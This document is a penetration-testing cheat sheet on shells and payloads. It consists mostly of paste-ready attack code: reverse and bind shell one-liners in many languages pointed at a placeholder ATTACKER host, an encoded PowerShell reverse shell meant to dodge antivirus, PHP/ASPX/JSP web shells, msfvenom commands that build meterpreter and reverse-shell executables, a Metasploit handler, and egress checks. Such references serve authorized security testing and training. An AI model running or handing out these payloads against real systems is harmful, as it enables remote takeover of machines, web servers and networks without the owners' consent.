# 15 — Shells & Payloads

Bind shells, reverse shells, payload generation with `msfvenom`, web shells, and post-callback stabilization.

## Bind vs reverse

| | Bind | Reverse |
|---|---|---|
| Listener on | Target | Attacker |
| Connection direction | Attacker → Target | Target → Attacker |
| Beats | Outbound-only firewalls | Inbound-only filters |
| When | Target is reachable directly | Target is behind NAT / egress allowed |

Reverse shells are the default in modern engagements because outbound is usually less filtered.

## Listeners (attacker)

```bash
# netcat (traditional)
nc -lvnp 4444
nc.traditional -lvnp 4444             # has -e on Debian/Kali

# ncat (with TLS, optional auth)
ncat -lvnp 4444
ncat --ssl -lvnp 4444
ncat -e /bin/bash -lvnp 4444          # bind shell side

# socat (full-fat: TLS, ptys, multiple peers)
socat -d -d TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# rlwrap (readline + history) — wrap any of the above
rlwrap nc -lvnp 4444

# pwncat-cs (ext. of pwncat: auto-stabilization, persistence)
pip install pwncat-cs
pwncat-cs -lp 4444
```

For HTTPS/2 reverse shells over a clean cert: see Cobalt Strike / Sliver / Mythic in scope-appropriate engagements.

## Linux reverse shells

```bash
# bash /dev/tcp
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
bash -c '0<&196;exec 196<>/dev/tcp/ATTACKER/4444; sh <&196 >&196 2>&196'

# nc
nc -e /bin/bash ATTACKER 4444
mkfifo /tmp/f; nc ATTACKER 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f

# python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# php
php -r '$s=fsockopen("ATTACKER",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# ruby
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("ATTACKER",4444))'

# socat (great quality)
socat TCP:ATTACKER:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# awk
awk 'BEGIN{s="/inet/tcp/0/ATTACKER/4444";while(42){do{printf"shell> "|&s;s|&getline c;if(c){while((c|&getline)>0)print|&s;close(c)}}while(c!="exit")close(s)}}' /dev/null
```

Generators (paste-ready, encoded variants):

- https://www.revshells.com/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Windows reverse shells

```powershell
# PowerShell TCP (classic Nishang style, single-line)
$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String);$ob=([Text.Encoding]::ASCII).GetBytes($o + 'PS ' + (pwd).Path + '> ');$s.Write($ob,0,$ob.Length);$s.Flush()};$c.Close()

# Encoded form (avoid quoting issues / basic AV strings)
$cmd = '<the above on one line>'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -NoP -W Hidden -Enc $enc
```

```cmd
:: nc.exe (you bring it; flagged by AV)
nc.exe -e cmd.exe ATTACKER 4444
```

For modern Windows, prefer:

- `msfvenom` shellcode + a loader you trust.
- C# tradecraft (`SharpHound`-class) over PowerShell when AMSI/CLM is in play.
- `ConPtyShell` for full TTY-quality Windows reverse shells.

## Bind shells

```bash
# Linux (target listens)
nc -lvnp 4444 -e /bin/bash
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

```powershell
# Windows (target listens)
$ll=[System.Net.Sockets.TcpListener]4444; $ll.Start(); $cl=$ll.AcceptTcpClient()
# (then wire stream to cmd.exe — full snippets in PayloadsAllTheThings)
```

## Web shells

Single-line web shells are useful when LFI/RFI/upload gives you write-anywhere.

### PHP

```php
<?php system($_GET['c']); ?>
<?php passthru($_REQUEST['c']); ?>
<?php @eval($_POST['c']); ?>            // classic china-chopper style
```

Better: drop a real PHP reverse shell file (e.g., from PayloadsAllTheThings or pentestmonkey) so you do not have to keep urlencoding.

### ASP / ASPX

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
  var c = Request["c"];
  var psi = new ProcessStartInfo("cmd.exe", "/c " + c) { RedirectStandardOutput = true, UseShellExecute = false };
  var p = Process.Start(psi);
  Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### JSP

```jsp
<%@ page import="java.util.*,java.io.*"%>
<% String c=request.getParameter("c"); if(c!=null){
  Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",c});
  BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l; while((l=r.readLine())!=null){ out.println(l); }
} %>
```

## Payload generation with msfvenom

```bash
# List
msfvenom -l payloads | grep meterpreter
msfvenom --list formats

# Linux ELF reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o sh.elf

# Linux meterpreter
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o met.elf

# Windows EXE reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o sh.exe

# Windows meterpreter (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o met.exe

# Windows meterpreter (stageless: bigger but no second-stage download)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o met.exe

# Windows shellcode for loader
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o sc.bin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f c     # for C source

# Web shells
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o app.war

# Encoders / iterations (cosmetic — modern AV is not bypassed by encoders alone)
msfvenom -p ... -e x86/shikata_ga_nai -i 5 -f exe -o out.exe

# Bad chars
msfvenom -p ... -b '\x00\x0a\x0d' -f c
```

Staged vs stageless:

- **Staged** (`/`) — small first-stage downloads the rest from the handler.
- **Stageless** (`_`) — full payload up front; handler just receives the connection. Stageless avoids second-stage detection and works without a Metasploit handler in some cases.

## Metasploit handler (catching msfvenom payloads)

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
  set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; run -j"
```

`set EnableStageEncoding true` and `set StageEncoder ...` add light evasion on stagers.

## Stabilizing a Linux reverse shell (full TTY)

```bash
# Inside the shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'   # or python / script
export TERM=xterm-256color
# Background the shell:
^Z
# On the attacker:
stty raw -echo; fg
# Press Enter, then:
reset
```

Resize:

```bash
stty rows 50 cols 200    # adjust to your local terminal
```

## Stabilizing on Windows

- Use `ConPtyShell` for a real TTY (`Invoke-ConPtyShell ATTACKER 4444 80 30`).
- Or upgrade to a Meterpreter session; `migrate -N <process>` into a stable process.
- Or jump to WinRM / RDP once you have credentials.

## Out-of-band egress checks (before picking a shell)

```bash
# DNS
nslookup attacker-controlled.tld
# HTTPS to common ports
curl -sI https://attacker:443/
curl -sI https://attacker:8443/
# Plain TCP outbound
echo > /dev/tcp/attacker/4444 && echo "egress 4444 OK"
```

If only DNS leaves the box, use `iodine` / `dnscat2` for tunneled C2 (with authorization).

## Sources

- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks (Reverse shells): https://book.hacktricks.wiki/en/generic-methodologies-and-resources/shells/
- revshells.com generator: https://www.revshells.com/
- Rapid7 Metasploit docs: https://docs.metasploit.com/
- ConPtyShell: https://github.com/antonioCoco/ConPtyShell
